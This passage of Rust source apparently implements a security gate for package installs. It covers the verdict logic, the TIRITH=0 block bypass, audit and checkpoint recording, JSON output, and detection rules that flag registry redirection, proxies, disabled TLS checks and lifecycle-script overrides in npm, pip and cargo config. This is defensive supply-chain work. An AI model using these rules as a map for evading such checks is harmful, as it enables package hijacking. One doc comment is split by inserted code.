    // recorded as bypassed. `--no-exec` never installs (no gate); its exit still
    // mirrors the verdict (0 allow, 1 block, 2 warn) so a script can branch.
    let decision = if no_exec {
        if !json {
            eprintln!(
                "tirith install: --no-exec — analysis only, '{}' was NOT run.",
                install_command_for_human_with_compiled(&plan.argv, &output_dlp),
            );
        }
        match plan.verdict.action {
            Action::Allow => ProceedDecision::Stop(0),
            Action::Block => ProceedDecision::Stop(1),
            Action::Warn | Action::WarnAck => ProceedDecision::Stop(2),
        }
    } else {
        // C12: the owned execution transition. Combined with `decide_proceed`
        // so a task denial can only ever force a stop: it is folded in BEFORE
        // the proceed decision is consulted, upstream of `ProceedDecision::Go`
        // and therefore upstream of `run_and_record`, which is what creates the
        // checkpoint and spawns the manager.
        //
        // `--no-exec` never reaches this branch, so a check-only run cannot be
        // recorded as executed by the gate.
        let execution_assessment = evaluate_install_boundary(
            tirith_core::task_boundary::OwnedBoundary::PackageManagerExecution,
            manager,
            args,
            &policy,
            &[
                tirith_core::effects::CommandEffectKind::PackageInstall,
                tirith_core::effects::CommandEffectKind::NetworkEgress,
                tirith_core::effects::CommandEffectKind::FilesystemWrite,
            ],
        );
        match execution_assessment.refusal(false) {
            Some(reason) => {
                // Printed in JSON mode too. The envelope on stdout stays a
                // clean `{"analysis":..,"outcome":null}`, and a refusal with no
                // stated reason anywhere is worse than a line on stderr.
                eprintln!(
                    "tirith install: task gate refused before '{}' ran: {}",
                    install_command_for_human_with_compiled(&plan.argv, &output_dlp),
                    install_value_for_human(reason),
                );
                ProceedDecision::Stop(1)
            }
            None => decide_proceed(&plan.verdict, &policy, interactive, yes, json),
        }
    };

    // If the gate bypassed a BLOCK via `TIRITH=0`, stamp the verdict so the audit
    // records what happened (else it logs `bypass_honored: false`).
    if matches!(decision, ProceedDecision::Go) && plan.verdict.action == Action::Block {
        plan.verdict.bypass_requested = true;
        plan.verdict.bypass_honored = true;
    }

    // Audit regardless of the decision — the analysis happened. A failed write
    // is a non-fatal notice (a record, not a gate), not silent.
    if let Err(e) = tirith_core::audit::log_verdict(
        &plan.verdict,
        &format!("install {}", plan.analysis_command),
        None,
        None,
        &policy.dlp_custom_patterns,
    ) {
        if !json {
            eprintln!(
                "tirith install: audit log not written (non-fatal): {}",
                tirith_core::output::sanitize_human_field_with_compiled(
                    &e.to_string(),
                    &output_dlp,
                ),
            );
        }
    }

    match decision {
        ProceedDecision::Stop(code) => {
            // JSON Stop path (Block refused, Warn declined, --no-exec): emit the
            // combined envelope with a no-outcome marker so it stays parseable.
            if json
                && !emit_combined_json(&plan, use_online, /* outcome = */ None, &output_dlp)
            {
                return 1;
            }
            code
        }
        // --- RECORD then RUN ---
        ProceedDecision::Go => {
            // M6 ch1 — Scoop is Windows-only at the real-run step; refuse to
            // invoke it elsewhere (the dry-run path above runs on every OS).
            if plan.manager.is_windows_only_runtime() && !cfg!(target_os = "windows") {
                if !json {
                    eprintln!(
                        "tirith install: refusing to run '{}' — {} is Windows-only \
                         at the real-run step. Use `--no-exec` to analyze on this OS, \
                         or run the command from a Windows host.",
                        install_command_for_human_with_compiled(&plan.argv, &output_dlp),
                        plan.manager.label(),
                    );
                } else {
                    let _ = emit_combined_json(
                        &plan,
                        use_online,
                        Some(OutcomeRecord {
                            ran: false,
                            exit_code: None,
                            checkpoint_id: None,
                            stdout: None,
                            stderr: None,
                            spawn_error: Some(format!(
                                "{} is Windows-only at the real-run step",
                                plan.manager.label()
                            )),
                        }),
                        &output_dlp,
                    );
                }
                return 2;
            }
            let Some(executable) = executable_binding.as_ref() else {
                eprintln!(
                    "tirith install: internal error: approved executable identity is unavailable"
                );
                return 2;
            };
            let runner = ProcessInstallRunner {
                executable,
                source_binding: &source_binding,
            };
            run_and_record(
                &plan,
                cwd.as_deref(),
                json,
                use_online,
                &runner,
                &output_dlp,
            )
        }
    }
}

/// Inspect source-selection environment and configuration before registry
/// scoring. Explicit CLI source flags are handled token-by-token in
/// `install_txn`; this catches the ambient/project configuration that the real
/// manager will also consume. Any ambiguous or custom source suppresses
/// official provenance instead of attaching it to unrelated bytes.
fn detect_registry_configuration_issue(
    manager: PackageManager,
    cwd: Option<&Path>,
) -> Option<String> {
    match manager {
        PackageManager::Npm => detect_npm_registry_configuration(cwd),
        PackageManager::Pip => detect_pip_registry_configuration(cwd),
        PackageManager::Cargo => detect_cargo_registry_configuration(cwd),
        _ => None,
    }
}

fn first_nonempty_env<'a>(names: &'a [&'a str]) -> Option<(&'a str, String)> {
    for &name in names {
        if let Ok(value) = std::env::var(name) {
            if !value.trim().is_empty() {
                return Some((name, value));
            }
        }
    }
    None
}

fn expected_registry_url(manager: PackageManager, value: &str) -> bool {
    let normalized = value.trim().trim_end_matches('/').to_ascii_lowercase();
    match manager {
        PackageManager::Npm => normalized == "https://registry.npmjs.org",
        PackageManager::Pip => normalized == "https://pypi.org/simple",
        PackageManager::Cargo => matches!(
            normalized.as_str(),
            "https://index.crates.io"
                | "sparse+https://index.crates.io"
                | "https://github.com/rust-lang/crates.io-index"
        ),
        _ => false,
    }
}

fn configuration_candidates(cwd: Option<&Path>, relative: &Path) -> Vec<PathBuf> {
    cwd.map(|cwd| configuration_candidates_for_path(cwd, relative))
        .unwrap_or_default()
}

fn configuration_candidates_for_path(root: &Path, relative: &Path) -> Vec<PathBuf> {
    root.ancestors()
        .map(|ancestor| ancestor.join(relative))
        .collect()
}

fn read_source_config(path: &Path) -> Result<Option<String>, String> {
    CapturedSourceConfig::capture(path.to_path_buf())
        .map(|(_, content)| content)
        .map_err(|error| format!("cannot inspect {}: {error}", path.display()))
}

fn detect_npm_registry_configuration(cwd: Option<&Path>) -> Option<String> {
    if let Some((name, value)) = first_nonempty_env(&["NPM_CONFIG_REGISTRY", "npm_config_registry"])
    {
        if !expected_registry_url(PackageManager::Npm, &value) {
            return Some(format!("{name} selects a non-official registry"));
        }
    }

    let mut paths = configuration_candidates(cwd, Path::new(".npmrc"));
    for name in [
        "NPM_CONFIG_USERCONFIG",
        "npm_config_userconfig",
        "NPM_CONFIG_GLOBALCONFIG",
        "npm_config_globalconfig",
    ] {
        if let Ok(path) = std::env::var(name) {
            if !path.trim().is_empty() {
                paths.push(PathBuf::from(path));
            }
        }
    }
    if let Some(home) = home::home_dir() {
        paths.push(home.join(".npmrc"));
    }
    paths.push(PathBuf::from("/etc/npmrc"));
    paths.sort();
    paths.dedup();
    for path in paths {
        let content = match read_source_config(&path) {
            Ok(Some(content)) => content,
            Ok(None) => continue,
            Err(reason) => return Some(reason),
        };
        if let Some(reason) = npm_config_source_issue(&content) {
            return Some(format!("{}: {reason}", path.display()));
        }
    }
    None
}

fn npm_config_source_issue(content: &str) -> Option<String> {
    let content = content.strip_prefix('\u{feff}').unwrap_or(content);
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = npm_ini_normalize_key(key);
        let value = npm_ini_normalize_atom(value);
        if matches!(key.as_str(), "userconfig" | "globalconfig") && !value.is_empty() {
            return Some(format!(
                "{key} selects another configuration file whose effective registry is not bound"
            ));
        }
        if (matches!(key.as_str(), "proxy" | "https-proxy" | "cafile" | "ca")
            || key.starts_with("ca["))
            && !value.is_empty()
        {
            return Some(format!(
                "{key} changes the transport trust path used to fetch registry bytes"
            ));
        }
        if matches!(key.as_str(), "script-shell" | "node-options") && !value.is_empty() {
            return Some(format!(
                "{key} selects an unverified executable or startup option for install lifecycle code"
            ));
        }
        // npm's INI parser accepts quoted atoms and can strip inline comments.
        // Only an unambiguous literal true is safe here; every other spelling
        // is source-unverified instead of trying to out-parse npm comments.
        if key == "strict-ssl" && !value.eq_ignore_ascii_case("true") {
            return Some(
                "strict-ssl disables certificate validation for registry fetches".to_string(),
            );
        }
        if key == "registry" && !expected_registry_url(PackageManager::Npm, &value) {
            return Some("registry selects a non-official origin".to_string());
        }
        if key.ends_with(":registry") && !expected_registry_url(PackageManager::Npm, &value) {
            return Some(format!("scoped registry setting '{key}' is ambiguous"));
        }
    }
    None
}

fn npm_ini_normalize_atom(value: &str) -> String {
    let value = value.trim();
    if value.starts_with('"') && value.ends_with('"') {
        if let Ok(decoded) = serde_json::from_str::<String>(value) {
            return decoded.trim().to_string();
        }
    }
    if let Some(quoted) = value
        .strip_prefix('\'')
        .and_then(|value| value.strip_suffix('\''))
    {
        let quoted = quoted.trim();
        // npm strips an outer single-quoted INI atom and then feeds a remaining
        // JSON string through JSON.parse. Thus `'"strict-ssl"'` is the real
        // `strict-ssl` key, not a harmless key containing quote characters.
        if quoted.starts_with('"') && quoted.ends_with('"') {
            if let Ok(decoded) = serde_json::from_str::<String>(quoted) {
                return decoded.trim().to_string();
            }
        }
        return quoted.to_string();
    }

    // npm's bundled INI parser truncates unquoted atoms at an unescaped `#`
    // or `;`, including inside keys, and unescapes an escaped comment marker.
    let mut normalized = String::with_capacity(value.len());
    let mut escaped = false;
    for character in value.chars() {
        if escaped {
            if matches!(character, '#' | ';' | '\\') {
                normalized.push(character);
            } else {
                normalized.push('\\');
                normalized.push(character);
            }
            escaped = false;
        } else if character == '\\' {
            escaped = true;
        } else if matches!(character, '#' | ';') {
            break;
        } else {
            normalized.push(character);
        }
    }
    if escaped {
        normalized.push('\\');
    }
    normalized.trim().to_string()
}

fn npm_ini_normalize_key(value: &str) -> String {
    let mut key = npm_ini_normalize_atom(value).to_ascii_lowercase();
    // npm's bundled `ini` parser treats a trailing `[]` as array syntax and
    // exposes the underlying key. Apply repeatedly because nested array
    // suffixes are also stripped by the parser. Security comparisons and
    // scoped-registry discovery must use that effective key.
    while key.ends_with("[]") {
        key.truncate(key.len() - 2);
    }
    key
}

fn detect_pip_registry_configuration(cwd: Option<&Path>) -> Option<String> {
    if let Some((name, value)) = first_nonempty_env(&["PIP_INDEX_URL", "PIP_PYPI_URL"]) {
        if !expected_registry_url(PackageManager::Pip, &value) {
            return Some(format!("{name} selects a non-official index"));
        }
    }
    for name in ["PIP_EXTRA_INDEX_URL", "PIP_FIND_LINKS"] {
        if let Ok(value) = std::env::var(name) {
            if !value.trim().is_empty() {
                return Some(format!("{name} adds an unverified source"));
            }
        }
    }
    if std::env::var("PIP_NO_INDEX")
        .ok()
        .is_some_and(|value| !matches!(value.trim(), "" | "0" | "false" | "no"))
    {
        return Some("PIP_NO_INDEX disables the validated registry".to_string());
    }

    let mut paths = configuration_candidates(cwd, Path::new("pip.conf"));
    if let Ok(virtual_env) = std::env::var("VIRTUAL_ENV") {
        paths.push(PathBuf::from(virtual_env).join("pip.conf"));
    }
    if let Ok(explicit) = std::env::var("PIP_CONFIG_FILE") {
        let explicit = PathBuf::from(explicit);
        if explicit != Path::new(null_device_path()) {
            paths.push(explicit);
        }
    }
    if let Some(home) = home::home_dir() {
        paths.push(home.join(".config/pip/pip.conf"));
        paths.push(home.join(".pip/pip.conf"));
        paths.push(home.join("Library/Application Support/pip/pip.conf"));
    }
    if let Some(xdg_home) = std::env::var_os("XDG_CONFIG_HOME") {
        if !xdg_home.is_empty() {
            paths.push(PathBuf::from(xdg_home).join("pip/pip.conf"));
        }
    }
    if let Some(xdg_dirs) = std::env::var_os("XDG_CONFIG_DIRS") {
        for directory in std::env::split_paths(&xdg_dirs) {
            paths.push(directory.join("pip/pip.conf"));
        }
    } else {
        paths.push(PathBuf::from("/etc/xdg/pip/pip.conf"));
    }
    paths.push(PathBuf::from("/Library/Application Support/pip/pip.conf"));
    paths.push(PathBuf::from("/etc/pip.conf"));
    paths.sort();
    paths.dedup();
    for path in paths {
        let content = match read_source_config(&path) {
            Ok(Some(content)) => content,
            Ok(None) => continue,
            Err(reason) => return Some(reason),
        };
        if let Some(reason) = pip_config_source_issue(&content) {
            return Some(format!("{}: {reason}", path.display()));
        }
    }
    None
}

fn pip_config_source_issue(content: &str) -> Option<String> {
    fn setting_issue(key: &str, value: &str) -> Option<String> {
        match key {
            "index-url" if !expected_registry_url(PackageManager::Pip, value) => {
                Some("index-url selects a non-official origin".to_string())
            }
            "extra-index-url" | "find-links" if !value.trim().is_empty() => {
                Some(format!("{key} changes the effective package source"))
            }
            "no-index"
                if !matches!(
                    value.trim().to_ascii_lowercase().as_str(),
                    "" | "0" | "false" | "no"
                ) =>
            {
                Some("no-index disables the validated package source".to_string())
            }
            _ => None,
        }
    }

    fn split_setting(line: &str) -> Option<(&str, &str)> {
        let delimiter = match (line.find('='), line.find(':')) {
            (Some(equals), Some(colon)) => equals.min(colon),
            (Some(equals), None) => equals,
            (None, Some(colon)) => colon,
            (None, None) => return None,
        };
        Some((&line[..delimiter], &line[delimiter.saturating_add(1)..]))
    }

    let mut pending: Option<(String, String)> = None;
    for raw_line in content.lines() {
        let trimmed = raw_line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with(';') {
            continue;
        }
        // ConfigParser continuation lines extend the preceding value. This is
        // the documented spelling for repeatable find-links/extra-index-url
        // settings and must not disappear merely because the first line after
        // `=` is empty.
        if raw_line.starts_with(char::is_whitespace) && !trimmed.starts_with('[') {
            if let Some((_key, value)) = pending.as_mut() {
                if !value.is_empty() {
                    value.push('\n');
                }
                value.push_str(trimmed);
            }
            continue;
        }
        if let Some((key, value)) = pending.take() {
            if let Some(issue) = setting_issue(&key, &value) {
                return Some(issue);
            }
        }
        if trimmed.starts_with('[') {
            continue;
        }
        let Some((key, value)) = split_setting(trimmed) else {
            continue;
        };
        pending = Some((
            key.trim().to_ascii_lowercase().replace('_', "-"),
            value.trim().to_string(),
        ));
    }
    if let Some((key, value)) = pending {
        if let Some(issue) = setting_issue(&key, &value) {
            return Some(issue);
        }
    }
    None
}

fn detect_cargo_registry_configuration(cwd: Option<&Path>) -> Option<String> {
    if let Ok(value) = std::env::var("CARGO_REGISTRY_DEFAULT") {
        if !value.trim().is_empty() && value.trim() != "crates-io" {
            return Some("CARGO_REGISTRY_DEFAULT selects another registry".to_string());
        }
    }
    if let Ok(value) = std::env::var("CARGO_REGISTRIES_CRATES_IO_INDEX") {
        if !value.trim().is_empty() && !expected_registry_url(PackageManager::Cargo, &value) {
            return Some(
                "CARGO_REGISTRIES_CRATES_IO_INDEX selects a non-official index".to_string(),
            );
        }
    }

    let mut paths = configuration_candidates(cwd, Path::new(".cargo/config.toml"));
    paths.extend(configuration_candidates(cwd, Path::new(".cargo/config")));
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        if !cargo_home.trim().is_empty() {
            paths.push(PathBuf::from(&cargo_home).join("config.toml"));
            paths.push(PathBuf::from(cargo_home).join("config"));
        }
    }
    if let Some(home) = home::home_dir() {
        paths.push(home.join(".cargo/config.toml"));
        paths.push(home.join(".cargo/config"));
    }
    paths.sort();
    paths.dedup();
    for path in paths {
        let content = match read_source_config(&path) {
            Ok(Some(content)) => content,
            Ok(None) => continue,
            Err(reason) => return Some(reason),
        };
        if let Some(reason) = cargo_config_source_issue(&content) {
            return Some(format!("{}: {reason}", path.display()));
        }
    }
    None
}

fn cargo_config_source_issue(content: &str) -> Option<String> {
    let parsed: toml::Value = match toml::from_str(content) {
        Ok(parsed) => parsed,
        Err(error) => return Some(format!("source configuration could not be parsed: {error}")),
    };
    if parsed.get("include").is_some() {
        return Some(
            "cargo config include requires recursive source verification and is treated as unverified"
                .to_string(),
        );
    }
    if let Some(http) = parsed.get("http") {
        for key in ["proxy", "cainfo", "proxy-cainfo"] {
            if http.get(key).is_some() {
                return Some(format!(
                    "http.{key} changes the transport used to fetch registry bytes"
                ));
            }
        }
        if http
            .get("check-revoke")
            .and_then(toml::Value::as_bool)
            .is_some_and(|enabled| !enabled)
        {
            return Some(
                "http.check-revoke disables certificate revocation checks for registry fetches"
                    .to_string(),
            );
        }
    }
    if let Some(default) = parsed
        .get("registry")
        .and_then(|value| value.get("default"))
        .and_then(toml::Value::as_str)
    {
        if default != "crates-io" {
            return Some("registry.default selects another registry".to_string());
        }
    }
    if let Some(crates_io) = parsed
        .get("source")
        .and_then(|value| value.get("crates-io"))
    {
        if crates_io.get("replace-with").is_some() {
            return Some("source.crates-io.replace-with redirects registry bytes".to_string());
        }
        if let Some(registry) = crates_io.get("registry").and_then(toml::Value::as_str) {
            if !expected_registry_url(PackageManager::Cargo, registry) {
                return Some("source.crates-io.registry selects a non-official origin".to_string());
            }
        }
    }
    if let Some(index) = parsed
        .get("registries")
        .and_then(|value| value.get("crates-io"))
        .and_then(|value| value.get("index"))
        .and_then(toml::Value::as_str)
    {
        if !expected_registry_url(PackageManager::Cargo, index) {
            return Some("registries.crates-io.index selects a non-official index".to_string());
        }
    }
    None
}

/// Outcome of the verdict gate.
enum ProceedDecision {
    /// Proceed with the install.
    Go,
    /// Do not install; exit with this code.
    Stop(i32),
}

/// Apply the verdict gate, consistent with `tirith check`: Block refuses (unless
/// policy + `TIRITH=0` bypass), Warn/WarnAck need `--yes` or an interactive `y`,
/// Allow proceeds.
fn decide_proceed(
    verdict: &Verdict,
    policy: &Policy,
    interactive: bool,
    yes: bool,
    json: bool,
) -> ProceedDecision {
    match verdict.action {
        Action::Allow => ProceedDecision::Go,

        Action::Block => {
            // Policy-gated `TIRITH=0` bypass (same as `tirith check`); a
            // non-interactive session needs the extra policy opt-in.
            let bypass_set = std::env::var("TIRITH").ok().as_deref() == Some("0");
            let bypass_allowed =
                policy.allow_bypass_env && (interactive || policy.allow_bypass_env_noninteractive);
            if bypass_set && bypass_allowed {
                if !json {
                    eprintln!(
                        "tirith install: BLOCK bypassed via TIRITH=0 (policy permits) — \
                         proceeding against advice."
                    );
                }
                ProceedDecision::Go
            } else {
                if !json {
                    eprintln!(
                        "tirith install: refusing to install — the analysis BLOCKED \
                         this transaction (see findings above)."
                    );
                    if policy.allow_bypass_env {
                        eprintln!("  to override against advice: TIRITH=0 tirith install ...");
                    }
                }
                ProceedDecision::Stop(1)
            }
        }

        Action::Warn | Action::WarnAck => {
            if yes {
                if !json {
                    eprintln!(
                        "tirith install: proceeding past {} warning(s) (--yes).",
                        verdict.findings.len()
                    );
                }
                return ProceedDecision::Go;
            }
            if !interactive {
                if !json {
                    eprintln!(
                        "tirith install: {} warning(s) — not installing in a \
                         non-interactive session. Re-run with --yes to proceed.",
                        verdict.findings.len()
                    );
                }
                return ProceedDecision::Stop(2);
            }
            // Interactive acknowledgement, mirroring `tirith check`.
            eprint!(
                "tirith install: proceed with {} warning(s) and install? [y/N] ",
                verdict.findings.len()
            );
            let mut input = String::new();
            if std::io::stdin().read_line(&mut input).is_err() {
                eprintln!("tirith install: could not read confirmation — not installing.");
                return ProceedDecision::Stop(2);
            }
            if matches!(input.trim(), "y" | "Y" | "yes" | "Yes") {
                ProceedDecision::Go
            } else {
                eprintln!("tirith install: cancelled — nothing was installed.");
                ProceedDecision::Stop(2)
            }
        }
    }
}

/// Take a before-install checkpoint, run the real install via `runner`, then
/// report — the *record* and *run* steps.
///
/// The checkpoint is best-effort and NOT a sandbox / rollback — it only makes
/// the change inspectable (`tirith checkpoint diff <id>`).
fn run_and_record(
    plan: &InstallPlan,
    cwd: Option<&str>,
    json: bool,
    online: bool,
    runner: &dyn InstallRunner,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> i32 {
    let command_display = install_command_for_human_with_compiled(&plan.argv, compiled);
    // --- RECORD: before-install checkpoint ---
    let checkpoint_id = match cwd {
        Some(dir) => {
            let trigger = format!("install {}", plan.analysis_command);
            match tirith_core::checkpoint::create(&[dir], Some(&trigger)) {
                Ok(meta) => {
                    if !json {
                        eprintln!(
                            "tirith install: checkpoint {} taken ({} file(s)) — \
                             before/after record only, not a sandbox.",
                            install_value_for_human_with_compiled(&meta.id, compiled),
                            meta.file_count,
                        );
                    }
                    Some(meta.id)
                }
                Err(e) => {
                    // A record, not a gate — report and continue.
                    if !json {
                        eprintln!(
                            "tirith install: checkpoint skipped (non-fatal): {}",
                            install_value_for_human_with_compiled(&e.to_string(), compiled),
                        );
                    }
                    None
                }
            }
        }
        None => None,
    };

    // --- RUN: the real install ---
    if !json {
        eprintln!("tirith install: running '{command_display}' ...");
    }
    // PR #121 fix-list item 3 — JSON mode CAPTURES child stdout/stderr into the
    // outcome envelope, else its progress lines break single-document parsing.
    let run_output = match runner.run(
        &plan.argv.program,
        &plan.argv.args,
        /* capture = */ json,
    ) {
        Ok(out) => out,
        Err(e) => {
            if !json {
                eprintln!(
                    "tirith install: failed to run '{}': {}",
                    install_value_for_human_with_compiled(&plan.argv.program, compiled),
                    install_value_for_human_with_compiled(&e.to_string(), compiled),
                );
            } else {
                // Spawn failure still gets a single parseable envelope.
                let _ = emit_combined_json(
                    plan,
                    online,
                    Some(OutcomeRecord {
                        ran: false,
                        exit_code: None,
                        checkpoint_id: checkpoint_id.as_deref(),
                        stdout: None,
                        stderr: None,
                        spawn_error: Some(e.to_string()),
                    }),
                    compiled,
                );
            }
            return 1;
        }
    };
    let exit_code = match run_output.exit_code {
        Some(code) => code,
        None => {
            if !json {
                eprintln!(
                    "tirith install: '{}' did not return an exit code \
                     (terminated by signal).",
                    install_value_for_human_with_compiled(&plan.argv.program, compiled),
                );
            }
            1
        }
    };

    if json {
        // PR #121 fix-list item 3 — emit ONE envelope holding analysis + outcome
        // (with captured child output embedded), so a consumer parses one document.
        let outcome = OutcomeRecord {
            ran: true,
            exit_code: Some(exit_code),
            checkpoint_id: checkpoint_id.as_deref(),
            stdout: run_output.stdout.as_deref(),
            stderr: run_output.stderr.as_deref(),
            spawn_error: None,
        };
        // A JSON-write failure must not report `0` success — surface exit 1 if the
        // envelope didn't reach the consumer (a non-zero install exit is kept).
        if !emit_combined_json(plan, online, Some(outcome), compiled) && exit_code == 0 {
            return 1;
        }
    } else {
        let after = if exit_code == 0 {
            "completed".to_string()
        } else {
            format!("exited {exit_code}")
        };
        eprintln!("tirith install: '{command_display}' {after}.");
        if let Some(id) = &checkpoint_id {
            eprintln!(
                "  before/after record: tirith checkpoint diff {}",
                install_value_for_human_with_compiled(id, compiled),
            );
        }
    }

    exit_code
}

/// One install transaction's outcome record, for the JSON envelope (borrowed
/// fields).
struct OutcomeRecord<'a> {
    /// `true` if the runner spawned (even on non-zero/signal exit); `false` on a
    /// spawn failure (`spawn_error` set, `exit_code` `None`).
    ran: bool,
    exit_code: Option<i32>,
    checkpoint_id: Option<&'a str>,
    stdout: Option<&'a str>,
    stderr: Option<&'a str>,
    spawn_error: Option<String>,
}

/// Emit the single `{"analysis":..,"outcome":..}` JSON envelope (PR #121
/// fix-list item 3). Returns `false` on a write failure. `outcome` is `None`
/// when the install never ran (the field is still present as `null` for a
/// The caveat every npm identity/provenance rendering carries, aliased to the
/// core constant so this surface, `cli::package`, and C17's npm provenance
/// receipt cannot drift into implying different things.
const NPM_BYTES_NOT_BOUND_CAVEAT: &str =
    tirith_core::provenance::npm_facts::NPM_BYTES_NOT_BOUND_CAVEAT;

/// The C13 npm `dist` facts for one planned package, when the online resolver
/// attached registry provenance. `None` offline, for a non-npm ecosystem, or
/// for a packument with no `dist` object.
fn npm_dist_facts_of(
    risk: &tirith_core::package_risk::RiskBreakdown,
) -> Option<&tirith_core::provenance::npm_facts::NpmDistFacts> {
    match &risk.api_signals {
        tirith_core::package_risk::ApiSignals::Available { provenance } => {
            provenance.npm_dist.as_ref()
        }
        _ => None,
    }
}

/// stable shape).
fn emit_combined_json(
    plan: &InstallPlan,
    online: bool,
    outcome: Option<OutcomeRecord>,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> bool {
    #[derive(Clone, Copy, serde::Serialize)]
    struct ArgvEnvelope<'a> {
        program: &'a str,
        args: &'a [String],
    }
    #[derive(serde::Serialize)]
    struct PackageOut<'a> {
        ecosystem: String,
        name: &'a str,
        #[serde(skip_serializing_if = "Option::is_none")]
        version: Option<&'a str>,
        risk_score: u32,
        risk_level: &'a str,
        /// C13: npm registry identity/provenance FACTS, when the registry
        /// supplied any. Parsed, never verified.
        #[serde(skip_serializing_if = "Option::is_none")]
        npm_dist: Option<&'a tirith_core::provenance::npm_facts::NpmDistFacts>,
        /// Present exactly when `npm_dist` is, so no consumer can read an
        /// integrity or signature value as a claim about the installed bytes.
        #[serde(skip_serializing_if = "Option::is_none")]
        npm_identity_caveat: Option<&'static str>,
    }
    #[derive(serde::Serialize)]
    struct AnalysisEnvelope<'a> {
        kind: &'a str,
        manager: &'a str,
        argv: ArgvEnvelope<'a>,
        // Kept for schema compatibility. Consumers that need exact argument
        // identity should use `argv`, because this field is display text.
        command: &'a str,
        sandboxed: bool,
        online: bool,
        packages: Vec<PackageOut<'a>>,
        verdict: &'a Verdict,
        notes: &'a [String],
        coverage: &'a tirith_core::install_txn::InstallCoverage,
        // M6 ch1 — for backends with no registry adapter, embed the same banner
        // the human output shows so a JSON consumer can detect weak coverage.
        #[serde(skip_serializing_if = "Option::is_none")]
        signals_note: Option<&'a str>,
    }
    #[derive(serde::Serialize)]
    struct OutcomeEnvelope<'a> {
        kind: &'a str,
        manager: &'a str,
        argv: ArgvEnvelope<'a>,
        // Kept for schema compatibility; see `AnalysisEnvelope::command`.
        command: &'a str,
        sandboxed: bool,
        ran: bool,
        #[serde(skip_serializing_if = "Option::is_none")]
        exit_code: Option<i32>,
        #[serde(skip_serializing_if = "Option::is_none")]
        checkpoint_id: Option<&'a str>,
        verdict_action: String,
        // Child output captured in JSON mode.
        #[serde(skip_serializing_if = "Option::is_none")]
        stdout: Option<&'a str>,
        #[serde(skip_serializing_if = "Option::is_none")]
        stderr: Option<&'a str>,
        #[serde(skip_serializing_if = "Option::is_none")]
        spawn_error: Option<&'a str>,
    }
    #[derive(serde::Serialize)]
    struct CombinedEnvelope<'a> {
        schema_version: u32,
        kind: &'a str,
        status: &'a str,
        executed: bool,
        exit_code: Option<i32>,
        analysis: AnalysisEnvelope<'a>,
        // `null` when the install did not run; key always present for a stable shape.
        outcome: Option<OutcomeEnvelope<'a>>,
    }

    let packages = plan
        .packages
        .iter()
        .map(|p| {
            let npm_dist = npm_dist_facts_of(&p.risk);
            PackageOut {
                ecosystem: p.reference.ecosystem.to_string(),
                name: &p.reference.name,
                version: p.reference.version.as_version_str(),
                risk_score: p.risk.score,
                risk_level: p.risk.risk_level,
                npm_dist,
                npm_identity_caveat: npm_dist.map(|_| NPM_BYTES_NOT_BOUND_CAVEAT),
            }
        })
        .collect();

    // Own the banner at this scope so its borrow outlives the move into the envelope.
    let signals_banner_owned: Option<String> = if plan.manager.lacks_registry_adapter() {
        Some(plan.manager.no_registry_adapter_banner())
    } else {
        None
    };
    let analysis = AnalysisEnvelope {
        kind: "install_analysis",
        manager: plan.manager.label(),
        argv: ArgvEnvelope {
            program: &plan.argv.program,
            args: &plan.argv.args,
        },
        command: &plan.analysis_command,
        sandboxed: false,
        online,
        packages,
        verdict: &plan.verdict,
        notes: &plan.notes,
        coverage: &plan.coverage,
        signals_note: signals_banner_owned.as_deref(),
    };

    // Own `spawn_error` at this scope so its borrow outlives the closure below.
    let spawn_error_owned: Option<String> = outcome.as_ref().and_then(|o| o.spawn_error.clone());
    let executed = outcome.as_ref().is_some_and(|outcome| outcome.ran);
    let exit_code = outcome.as_ref().and_then(|outcome| outcome.exit_code);
    let status = match outcome.as_ref() {
        None => "not_run",
        Some(outcome) if !outcome.ran => "spawn_failed",
        Some(outcome) if outcome.exit_code.is_none() => "signal_terminated",
        Some(_) => "exited",
    };
    let outcome_env = outcome.map(|o| OutcomeEnvelope {
        kind: "install_outcome",
        manager: plan.manager.label(),
        argv: ArgvEnvelope {
            program: &plan.argv.program,
            args: &plan.argv.args,
        },
        command: &plan.analysis_command,
        sandboxed: false,
        ran: o.ran,
        exit_code: o.exit_code,
        checkpoint_id: o.checkpoint_id,
        verdict_action: format!("{:?}", plan.verdict.action),
        stdout: o.stdout,
        stderr: o.stderr,
        spawn_error: spawn_error_owned.as_deref(),
    });

    let combined = CombinedEnvelope {
        schema_version: 2,
        kind: "install",
        status,
        executed,
        exit_code,
        analysis,
        outcome: outcome_env,
    };

    let mut combined = match serde_json::to_value(combined) {
        Ok(value) => value,
        Err(error) => serde_json::json!({
            "schema_version": 2,
            "kind": "install",
            "analysis_complete": false,
            "analysis_incomplete": true,
            "error": error.to_string(),
        }),
    };
    append_install_policy_diagnostics_json(&mut combined, compiled);
    tirith_core::redact::redact_json_strings(&mut combined, compiled);
    let combined = tirith_core::verdict::bound_json_value_for_output(combined);
    write_json_stdout(&combined)
}

// url form — delegates to the existing `tirith run` machinery

/// The `url` form: download-and-run an install script. Does NOT re-implement
/// download/execution — delegates to [`tirith_core::runner`] (size cap, timeout,
/// SHA-256, static analysis, interpreter allowlist, [`Receipt`], confirm prompt).
/// `tirith install` adds a download-shaped preflight verdict on top (a BLOCK
/// refuses before any download); `runner::run`'s own prompt gates execution.
#[cfg(unix)]
fn run_url(
    args: &[String],
    _online: bool,
    _offline: bool,
    json: bool,
    no_exec: bool,
    sha256: Option<String>,
) -> i32 {
    let url = match args {
        [single] => single.as_str(),
        [] => {
            eprintln!("tirith install: no URL given.");
            eprintln!("  try: tirith install url https://get.example-tool.sh");
            return 2;
        }
        _ => {
            eprintln!(
                "tirith install: the url form takes exactly one URL \
                 (got {} arguments).",
                args.len()
            );
            return 2;
        }
    };

    // Executed child bytes can never share structured stdout with a trusted JSON
    // envelope. Refuse before preflight, DNS, download, or confirmation so this
    // mode emits exactly one Tirith-owned document.
    if json && !no_exec {
        let _ = write_json_stdout(&build_live_url_json_refusal());
        return 1;
    }

    let cwd = std::env::current_dir()
        .ok()
        .map(|p| p.display().to_string());
    let interactive = is_terminal::is_terminal(std::io::stderr());
    let _policy_diagnostic_capture = tirith_core::policy::PolicyDiagnosticCapture::start();

    // --- ANALYZE: URL preflight ---
